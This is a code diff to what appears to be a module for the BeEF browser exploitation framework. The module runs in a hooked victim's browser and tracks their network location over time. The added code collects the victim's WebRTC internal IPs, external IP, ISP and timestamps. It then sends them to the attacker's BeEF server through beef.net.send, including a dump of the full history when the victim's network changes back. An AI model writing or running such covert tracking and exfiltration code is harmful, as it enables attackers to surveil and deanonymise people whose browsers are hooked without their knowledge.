@@ -71,6 +71,19 @@ Beefaredormant.prototype.verbLog = function(msg) {
   }
 }
 
+Beefaredormant.prototype.dumpToBeef = function() {
+  // Because fuseall includes *all* the state info, lets dump it
+  // to the beef handler
+  this.fuseall.forEach(function(network) {
+    let msg = "Time: '" + network.ts + "' | ";
+    msg = msg + "RTC: '" + network.rtc + "' | ";
+    msg = msg + "External: '" + network.ip + "' | ";
+    msg = msg + "ISP: '" + network.shorttitle + " - " + network.title + "'";
+    beef.net.send('/dormantdomlogger',0,{message: msg});
+  });
+
+}
+
 Beefaredormant.prototype.printStatus = function(sendtobeef) {
   var sendtobeef = typeof sendtobeef !== 'undefined' ? sendtobeef : false;
 
@@ -80,10 +93,11 @@ Beefaredormant.prototype.printStatus = function(sendtobeef) {
   this.verbLog("ISP: '" + this.isp + "'");
 
   if (sendtobeef == true) {
-    this.verbLog("FIX THIS")
-    //beef.net.send('<%= @command_url %>', <%= @command_id %>,
-    //              "OnlineStatus="+onlineStatus+"&RtcIps="+rtcIps+
-    //              "&ExternalIp="+externalIp+"&isp="+isp);
+    let msg = "Online: '" + this.onlineStatus + "' | ";
+    msg = msg + "RTC: '" + this.rtcIps + "' | ";
+    msg = msg + "External: '" + this.externalIp + "' | ";
+    msg = msg + "ISP: '" + this.isp + "'";
+    beef.net.send('/dormantdomlogger',0,{message: msg});
   }
 }
 
@@ -218,7 +232,7 @@ Beefaredormant.prototype.saveState = function(saveLocal, id, online, rtc, ip, is
     asshort = isp.split(" - ")[0]
   }
 
-  let asn = {title: astitle, shorttitle: asshort, id: id};
+  let asn = {title: astitle, shorttitle: asshort, id: id, rtc: rtc, ip: ip, ts: Date.now()};
   this.fuseall.push(asn); // we'll keep on building these up
 
   if (id === 0) {
@@ -298,10 +312,10 @@ Beefaredormant.prototype.presenceCheck = function() {
 
                 if (this.checkInitialRtcOrIsp(e, JSON.parse(b).asn)) {
                   this.verbLog("We are back home now .. ?");
-                  this.backHome();
+                  this.backHome(e,b);
                 } else {
                   this.verbLog("We are now on a different ISP");
-                  this.netRecon(e);
+                  this.netRecon(e,b);
                 }
               }
             }.bind(this));
@@ -318,10 +332,10 @@ Beefaredormant.prototype.presenceCheck = function() {
             this.getExternalDetails(function(b) {
               if (this.checkInitialRtcOrIsp(e, JSON.parse(b).asn)) {
                 this.verbLog("We are back home now...");
-                this.backHome();
+                this.backHome(e,b);
               } else {
                 this.verbLog("We are definitely not home..");
-                this.netRecon(e);
+                this.netRecon(e,b);
               }
             }.bind(this));
 
@@ -353,13 +367,22 @@ Beefaredormant.prototype.presenceCheck = function() {
   }
 } // end of presenceCheck()
 
-Beefaredormant.prototype.backHome = function() {
+Beefaredormant.prototype.backHome = function(rtcresult, externalDetails) {
+
+  this.netcount++;
+  this.externalIp = JSON.parse(externalDetails).isp;
+  this.isp = JSON.parse(externalDetails).asn;
+
+  this.saveState(this.saveLocal, this.netcount, this.onlineStatus, rtcresult, this.externalIp, this.isp);
+
   if (this.stealthLevel > 1) {
     // we are back home
     // send all cached module responses
     beef.aredormanthelpers.flush();
 
     beef.updater.lock = false; // Allow beef to talk again
+
+    this.dumpToBeef(); // Dump *all* of the network info back
   }
 
   // kick off timer again
@@ -376,12 +399,32 @@ Beefaredormant.prototype.checkInitialRtcOrIsp = function(ip, isp) {
     if (ip.toUpperCase() === localStorage.getItem('rtc_0').toUpperCase()) {
       this.verbLog("ip is exactly the same");
       result = true;
+    } else {
+      let matchedIp = "";
+      let brokenew = ip.split(".");
+      let brokeold = localStorage.getItem('rtc_0').split(".");
+
+      for (var i = 0; i < 4; i++) {
+        if (i > 0) {
+          matchedIp = matchedIp + ".";
+        }
+        if (brokenew[i] === brokeold[i]) {
+          matchedIp = matchedIp + brokenew[i];
+        } else {
+          matchedIp = matchedIp + "xxx";
+        }
+      }
+
+      this.verbLog("ip matching hitrate: " + matchedIp);
     }
 
     if (isp.toUpperCase() === localStorage.getItem('isp_0').toUpperCase()) {
       this.verbLog("ISP is exactly the same");
       result = true;
     }
+
+    //debug only
+
 
     if (result === false) {
       this.verbLog("Neither IP or ISP are exactly the same - fuzzy matching..");
@@ -391,6 +434,8 @@ Beefaredormant.prototype.checkInitialRtcOrIsp = function(ip, isp) {
       // first lets only allow particular characters
       let shortisp = isp.replace(/[^a-zA-Z0-9-_]/,'');
       // shorten
+      // by removing words less than 1-3 characters long
+      shortisp = shortisp.replace(/\W*\b\w{1,2}\b/g,"");
       shortisp = shortisp.substring(0,32);
       let fuse = new Fuse(this.fusefirst, this.fuseoptions);
       let fuseresult = fuse.search(shortisp);
@@ -461,12 +506,12 @@ Beefaredormant.prototype.startTimers = function() {
   this.agOnlineIntervalTimer = setInterval(function() {this.checkOnlineState()}.bind(this),200);
 }
 
-Beefaredormant.prototype.netRecon = function(rtcresult) {
+Beefaredormant.prototype.netRecon = function(rtcresult, externalDetails) {
   this.verbLog("PERFORM NETWORK RECON HERE!");
-  this.getExternalDetails(function(e) {
-    this.externalIp = JSON.parse(e).ip;
+  // this.getExternalDetails(function(e) {
+    this.externalIp = JSON.parse(externalDetails).ip;
     this.rtcIps = rtcresult;
-    this.isp = JSON.parse(e).asn;
+    this.isp = JSON.parse(externalDetails).asn;
 
     this.netcount++;
 
@@ -490,7 +535,7 @@ Beefaredormant.prototype.netRecon = function(rtcresult) {
 
     // restart timer
     this.startTimers();
-  }.bind(this));
+  // }.bind(this));
 } // end of netRecon()
 
 Beefaredormant.prototype.setupPhase = function() {
